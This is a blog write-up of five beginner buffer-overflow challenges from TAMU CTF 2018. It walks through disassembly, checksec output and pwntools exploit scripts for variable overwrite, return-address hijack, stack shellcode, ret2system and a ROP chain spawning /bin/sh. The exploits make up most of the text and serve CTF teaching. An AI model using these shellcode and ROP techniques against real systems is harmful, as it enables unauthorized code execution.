---
title: TAMU CTF 2018
date: 2019-01-07 13:00:00
categories:
  - Pwn
  - linux
  - stack
tags:
  - CTF
  - stack
  - ROP
---

This school CTF had a good set of stack based challenges for beginners
<!-- excerpt -->

## pwn1

`32-bit executable, dynamically linked, not stripped`

When you run the executable in the terminal, the program simple asks for an input and checks whether it is the secret it is looking for or not. 

debugging in GDB...
```bash
gdb-peda$ checksec
CANARY    : disabled
FORTIFY   : disabled
NX        : ENABLED
PIE       : disabled
RELRO     : Partial
```
Going through the assembly code, we can see that see a gets() function. This gives us a chance to corrupt any stack address higher than the stack address where the gets() is to read into. We can also see a call to 'print_flag' function. This call instruction is executed only after a cmp instruction which compares [ebp-0xc] with '0xf007ba11'.

```nasm
0x0804861d <+107>:	cmp    DWORD PTR [ebp-0xc],0xf007ba11
0x08048624 <+114>:	jne    0x804862d <main+123>
0x08048626 <+116>:	call   0x804854b <print_flag>
```
The value in the memory location '0xc'(12) bytes lower than the memory location that is stored in ebp is compared with '0xf007ba11'. If the compare statement is true it sets the ZF, and jne instruction is not executed and 'print_flag' is called. 

#### EXPLOIT 
Here the gets() function allows us to write into any higher stack memory location. Hence we can write '0xf007ba11' in the required memory location to get the flag.
```python
from pwn import *

junk="a"*23
s=p32(0xf007ba11)

print junk + s
```

<hr>
## pwn2

`32-bit executable, dynamically linked, not stripped`

This challenge is similar to last one expect that there is a function 'print flag' that prints the flag.

debugging in GDB...
```bash
gdb-peda$ checksec
CANARY    : disabled
FORTIFY   : disabled
NX        : ENABLED
PIE       : disabled
RELRO     : Partial
```
The program simply reads the input and prints it.

```nasm
0x080485d2 <+32>:	lea    eax,[ebp-0xef]
0x080485d8 <+38>:	push   eax
0x080485d9 <+39>:	call   0x80483d0 <gets@plt>
```
#### EXPLOIT 
Again, a vulnerable gets() function is used to read the input. We can simply overwrite the return address of the function and get the flag as 'print flag' function is called.

```python
from pwn import *
 
junk="a"*243
flag=p32(0x0804854b)
 
print junk + flag
```


<hr>
## pwn3

`32-bit executable, dynamically linked, not stripped`

pwn3 is similar to pwn2 in the way it reads the input, via a gets() function.

debugging in GDB...
```bash
gdb-peda$ checksec
CANARY    : disabled
FORTIFY   : disabled
NX        : disabled
PIE       : disabled
RELRO     : Partial
```
The program when run gives us a leak of a stack address. This address is the same as the address that gets() reads into.
```python
0x080484d7 <+12>:	lea    eax,[ebp-0xee]
0x080484dd <+18>:	push   eax
0x080484de <+19>:	push   0x8048600
0x080484e3 <+24>:	call   0x8048370 <printf@plt>
0x080484e8 <+29>:	add    esp,0x10
0x080484eb <+32>:	sub    esp,0xc
0x080484ee <+35>:	push   0x8048618
0x080484f3 <+40>:	call   0x8048370 <printf@plt>
0x080484f8 <+45>:	add    esp,0x10
0x080484fb <+48>:	sub    esp,0xc
0x080484fe <+51>:	lea    eax,[ebp-0xee]
0x08048504 <+57>:	push   eax
0x08048505 <+58>:	call   0x8048380 <gets@plt>
```
##### EXPLOIT
As we can see that NX is disabled, the stack is a executable section of memory. We can write opcodes on the stack and then overwrite the return address with the address given to us by the program. So the shellcode is executed and shell is pwned. I used pwntools to receive the leak and add it into my exploit.
```python
from pwn import *
 
shellcode="\x31\xdb\x6a\x17\x58\xcd\x80\xf7\xe3\xb0\x0b\x31\xc9\x51\x68\x2f\x2f\x 73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"
junk="a"*(242-len(shellcode))
 
s=process('./pwn3')
\#s=remote('pwn.ctf.tamu.edu',4323)
s.recvuntil('0x')
b=s.recvuntil('!')
  
b=b.translate(None,'!')
 
print b
b = "0x"+ b
print b
t=p32(int(b,16))
 
s.sendline(shellcode + junk + t)
s.send("ls" + "\n")
s.recv(20)
s.send("cat flag.txt" + "\n")
s.recv(100)
 
s.interactive()
```

<hr>
## pwn4

`32-bit executable, dynamically linked, not stripped`

Here we have a menu driven program that has bigger code but the vulnerability is again a gets() function that reads our the choice. 

debugging in GDB... 
```bash
gdb-peda$ checksec
CANARY    : disabled
FORTIFY   : disabled
NX        : ENABLED
PIE       : disabled
RELRO     : Partial
```
We can control the flow of the program by overwriting the return address. We can see PLT addresses of system() as it is used in the code. To pwn the shell we need to call system with a pointer to "/bin/sh" as the argument.

#### EXPLOIT 
Before calling system we need to somehow get a pointer to "/bin/sh". We have a gets() function that can read to any memory location. So we overwrite the return address of the function with gets() and the argument as any address that has read-write permission like from the bss section or the data section. So we can now the write "/bin/sh" into that address. The return address of read() is right above return address of the function we overwrote. So we can write that stack location with the address of system() and the pointer to "/bin/sh" as argument. The return address of system() will now be a pointer to "/bin/sh".
```python
from pwn import *

junk="a"*32
system=p32(0x08048430)
gets=p32(0x08048410)
shelladdr1=p32(0x0804a030)
shelladdr2=p32(0x804a034)
shell1="/bin/sh" + "\x00"
shell2="/sh" + "\x00"

s=process('./pwn4')
s.recv(50)
gdb.attach(s,'b*0x08048782')
s.sendline(junk + gets + system + shelladdr1 + shelladdr1)
s.sendline(shell1)
s.send("ls" + "\n")

s.interactive()
```

<hr>
## pwn5

`32-bit executable, statically linked, not stripped`

pwn5 is also a menu driven program. The vulnerability is a gets() function, but the gets() is in a function 'change_major' which is called when the corresponding option is selected.

debugging in GDB...
```bash
gdb-peda$ checksec
CANARY    : disabled
FORTIFY   : disabled
NX        : ENABLED
PIE       : disabled
RELRO     : Partial
```
#### EXPLOIT 
This time there is no system(). The binary is statically linked so we can use the 'int 0x80' instruction to get the shell. to get the shell when executing 'int 0x80' instruction we have to have the reference no. of 'execve' in eax, pointer to '/bin/sh' in ebx and null pointers in ecx and edx. We have to prepare a rop chain to get everything ready before execution of 'int 0x80'.
```python
from pwn import *
junk="a"*32

int80=p32(0x08071005)
pop_eax=p32(0x080bc396)
pop_ebx=p32(0x080481d1)
pop_ecx=p32(0x080e4325)
pop_edx=p32(0x0807338a)
shelladdr1=p32(0x80f0060)
shelladdr2=p32(0x80f0064)
shell1="/bin"
shell2="/sh" + "\x00"
null=p32(00)
refno=p32(0x0b)
mov_dword_edx_eax=p32(0x0805512b)
mov=p32(0x080543b6) \#mov_dword_ebx_eax_popebx_popesi_popedi

exploit = junk + pop_eax + shell1 + pop_ebx + shelladdr1 + mov + shelladdr2 + null + null + pop_eax + shell2 + mov + shelladdr1 + null + null + pop_eax + refno + pop_ecx + null + pop_edx + null + int80

s=process('./pwn5')
s.sendline('you')
s.sendline('are')
s.sendline('pwned')
s.sendline('y')
s.sendline('2')

s.sendline(exploit)

s.interactive()
```
